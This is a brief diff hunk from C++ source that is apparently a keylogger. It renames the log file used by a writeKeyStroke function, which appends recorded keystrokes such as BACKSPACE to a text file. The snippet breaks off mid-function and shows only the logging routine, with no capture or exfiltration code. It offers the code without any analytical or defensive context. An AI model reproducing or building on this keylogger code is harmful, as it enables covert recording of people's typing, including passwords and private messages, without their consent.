@@ -12,7 +12,7 @@
 void writeKeyStroke(int trueKey)
 {
     std::ofstream file;
-    file.open("logs.txt", std::ios::app);
+    file.open("log.txt", std::ios::app);
     if (trueKey == BACKSPACE)
     {
         file << "BACKSPACE";
